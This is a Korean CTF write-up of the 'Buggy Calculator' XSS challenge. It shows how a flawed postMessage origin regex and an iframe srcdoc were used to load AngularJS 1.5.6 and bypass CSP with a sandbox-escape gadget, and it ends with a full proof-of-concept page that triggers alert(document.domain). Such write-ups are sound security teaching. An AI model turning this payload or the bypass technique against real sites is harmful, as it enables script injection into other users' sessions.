---
layout: post
date: 2021-06-11 00:00:11
title: "Buggy Calculator Write Up"
categories: CTF
tags: [XSS]
author:
  - Jeongwon Jo

---
## Descriptions

Buggy Calculator 문제는 CSP 및 SOP를 우회하고 XSS를 트리거 하는 문제이다.

---
## Analysis

![](https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Buggy%20Calculator/images/1.png?raw=true)

문제로 들어오면 위와 같이 계산기가 있는 것을 볼 수 있고, 우리가 일반적으로 사용하는 방식과 동일하고, 숫자 및 연산자를 제외한 값들은 사용할 수 없다. 일단 여기에서는 따로 할 수 있거나 알 수 있는 게 없기 때문에 코드를 확인 해 보기로 했다.


```html
<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-eval' 'self'; object-src 'none'">
```
일단 코드를 보니 제일 위에 `meta`를 이용해서 `CSP`를 설정하고 있는 것을 볼 수 있다. CSP가 설정이 되어 있기 때문에 `<script>`, `<img>`와 같은 태그들을 이용해서 XSS 익스 시도를 할 수 있지만 CSP에 의해서 스크립트 실행은 되지 않을 것 이다. 그렇기 때문에 일단 해야 할 것 중 하나는 CSP 우회이다.

```html
		<script src="angular.min.js"></script>
		<script src="jquery.min.js"></script>
		<script src="script.js"></script>
```
밑으로 가서 코드를 확인해 보니 위와 같이 리소스 파일을 랜더링 하는 것을 볼 수 있다. 여기서 중요한 부분은 `angular.min.js` 파일을 랜더링 해온다는 것 이다. ` AngularJS`에서 사용되는 가젯들을 이용해서 XSS 익스를 시도할 수 있는데, 이를 이용하면 `CSP`를 쉽게 우회할 수 있을 거 같다.

```
/*
 AngularJS v1.5.6
 (c) 2010-2016 Google, Inc. http://angularjs.org
 License: MIT
*/
```
` AngularJS`의 버전을 확인해 보니 `1.5.6`인 것을 볼 수 있다. 버전마다 사용하는 가젯이 다르기 때문에 이제 해당 버전을 기반으로 해서 XSS 페이로드를 찾으면 된다. 나는 Owasp PDF에서 찾았다.

```js
function sendEquation(msg){
	theiframe.postMessage(msg);
}
```
```html
<iframe name="theiframe" style="height:65px;width:100%; left:-100px; margin-top:-05px;margin-bottom:-30px;" frameBorder="0" src="frame.html"></iframe>
```
위 리소스 파일들을 보면 `script.js` 파일도 랜더링 하는 것을 볼 수 있는데, 코드를 확인해보면 제일 밑에 위와 같이 `theiframe`라는 `iframe`으로 `postMessage` 메서드를 이용해서 값을 전달해주는 것을 볼 수 있고, 코드를 보면 위와 같이 `frame.html`을 끌어와서 사용하는 것도 볼 수 있다.

```html

<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-eval' 'self'; object-src 'none'">
		<link href='https://fonts.googleapis.com/css?family=Ubuntu:400,700' rel='stylesheet' type='text/css'>
		<script src="frame.js"></script>
		<style>
		html {
			clear: both;
			font-family: digital;
			font-size: 24px;
			text-align: right;
			letter-spacing: 5px;
		    font-family: 'Ubuntu', sans-serif;
		    overflow: hidden;
		}
		</style>
		<title></title>
	</head>
	<body>
		0
	</body>
</html>
```
위 코드는 `frame.html`의 코드인데 잘 보면 `frame.js`를 끌어와서 사용하는 것을 볼 수 있다. 지금까지 분석을 통해서 알 수 있는 건 게산기를 통해서 `1+1`을 입력 받고, 이를 `postMessage` 메서드를 이용해서 `frame.html`로 전달 하고, `frame.js`에서 특정 로직을 거치고 `<body>`의 삽입하는 거 같다. 즉, 우리가 원하는 값을 `body`의 삽입할 수 있으면 XSS 트리거를 할 수 있다.

![](https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Buggy%20Calculator/images/2.png?raw=true)

즉, 위 부분이 `frame.html`이라고 봐도 무방하다.

```js
window.addEventListener("message", receiveMessage, false);

function receiveMessage(event) {

	// verify sender is trusted
	if (!/^http:\/\/calc.buggywebsite.com/.test(event.origin)) {
		return
	}
	
	// display message 
	msg = event.data;
	if (msg == 'off') {
		document.body.style.color = '#95A799';
	} else if (msg == 'on') {
		document.body.style.color = 'black';
	} else if (!msg.includes("'") && !msg.includes("&")) {
		document.body.innerHTML=msg;
	}
}
```
위 코드는 `frame.js`의 코드이다. 잘 보면 `postMessage` 메서드로 전달 받은 값을 `receiveMessage` 메서드로 받고, 처리하는 것을 볼 수 있다. 이때 조건문을 이용해서 origin을 확인하는 것을 볼 수 있다. 즉, 해당 프레임으로 요청을 보낼 수 있는 건 `http://calc.buggywebsite.com`라는 오리진을 가진 애들이다.

```js
if (!/^http:\/\/calc.buggywebsite.com/.test("http://calc.buggywebsite.com.example.com")) {
    console.log("Same Origin Plz..");
}
> undefined
```
조건문을 위와 같이 확인을 해보면 정규식이 `^` 이기 때문에 `http://calc.buggywebsite.com.example.com`와 같은 오리진을 가진 사이트에서 요청을 보내줘도 필터링에 걸리지 않는 것을 볼 수 있다. `https://bugpoc.com/` 에서 프론트 엔드를 원하는 오리진으로 생성할 수 있는데 이를 이용해서 poc 코드를 올려주게 되면 위 구문은 쉽게 우회할 수 있다.

그리고 오리진 검사 로직을 통과하게 되면 msg 값을 조건문을 상황에 맞게 실행시키는 것을 볼 수 있는데, 여기서 제일 밑 조건문 내부를 보면 msg의 값을 innserHTML 메서드를 이용해서 돔 내부에 삽입하는 것을 볼 수 있는데 HTML 5에서는 innserHTML의 값으로 `<script>`가 들어오게 되면 스크립트 태그를 실행시키지 않기 때문에 `<script>` 태그를 제외한 나머지 태그를 이용해서 XSS 트리거를 해야 한다.

![](https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Buggy%20Calculator/images/3.png?raw=true)

그래서 이미지 태그를 이용해서 XSS를 트리거 하려 했지만 frame.html에도 csp가 설정이 되어 있어 csp에 걸리는 것을 볼 수 있다. 결국에는 AngularJS 가젯을 이용해서 XSS를 트리거 해야 하는데 `frame.html`에는 `angular.min.js` 파일이 랜더링 되어 있지 않기 때문에 `<script>` 태그를 이용해서 불러와줘야 한다. 그치만 우리는 `<script>` 태그를 사용할 수 없다.

하지만 `<iframe>` 태그의 srcdoc 속성을 이용해서 프레임 내에 `<script>` 태그를 이용하면 iframe 내부에서 별도로 코드를 실행 시키기 때문에 이를 우회하고 스크립트 태그를 실행 시킬 수 있다. 

```html
<iframe srcdoc="<script src=/angular.min.js></script><div ng-app>{{ 7*7 }}</div>"></iframe>
```
그래서 위와 같이 페이로드를 작성해주었다. socdoc를 보면 `<script>` 태그를 이용해서 앵귤러 파일을 랜더링 해준 후에 앵귤러 표현식을 이용해 주었다. `<div>` 태그의 들어 있는 `ng-app`은 이 태그를 기준으로 앵귤러를 사용하겠다는 지시문이다. 

![](https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Buggy%20Calculator/images/4.png?raw=true)

돔으로 넣어주니 iframe 내에서 스크립트 태그가 잘 실행 됐고, 앵귤러 표현식도 잘 되는 것을 볼 수 있었다.

![](https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Buggy%20Calculator/images/5.png?raw=true)

이제 앵귤러 표현식으로 가젯을 이용해서 alert() 함수를 실행 시켜 주면 된다. 가젯을 이용한 XSS Poc 코드는 [Owasp](https://owasp.org/www-chapter-london/assets/slides/OWASPLondon20170727_AngularJS.pdf)에서 확인할 수 있었다. 

---
## Exploit

![](https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Buggy%20Calculator/images/trigger.gif?raw=true)

---
## Poc (Sollution)

```html
<!DOCTYPE html>
<html>
    <head>
        <title>Poc XSS about Calculate</title>
    </head>
    <script>
        const win = window.open('http://calc.buggywebsite.com/frame.html');
        const exploit = function(){
            setTimeout(function(){ win.postMessage(["<iframe srcdoc=\"<script src=/angular.min.js><\/script><div ng-app>{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(document.domain)');}}</div>\"></iframe>"],'*') }, 3000);
        }
      </script>
    <body>
        <h1>BugPoc XSS Challenge</h1>

        <h3>If you click the button below and execute poc code, You can trigger the xss.</h3>
        <input type="button" onclick=exploit() value="Trigger">
    </body>
</html>
```

---
## Reference

[https://munhwasudo.tistory.com](https://munhwasudo.tistory.com/entry/2-ngapp-nginit-%EC%82%AC%EC%9A%A9%ED%95%98%EA%B8%B0-AngularJS%EA%B0%9C%EB%85%90-%EA%B0%84%EB%8B%A8%ED%95%9C-todo%EA%B0%9D%EC%B2%B4-%EB%A7%8C%EB%93%A4%EC%96%B4%EB%B3%B4%EA%B8%B0)<br>
[https://developer.mozilla.org/ko/docs/Web/API/Window/postMessage](https://developer.mozilla.org/ko/docs/Web/API/Window/postMessage)<br>
[https://owasp.org/www-chapter-london/assets/slides/OWASPLondon20170727_AngularJS.pdf](https://owasp.org/www-chapter-london/assets/slides/OWASPLondon20170727_AngularJS.pdf)

---
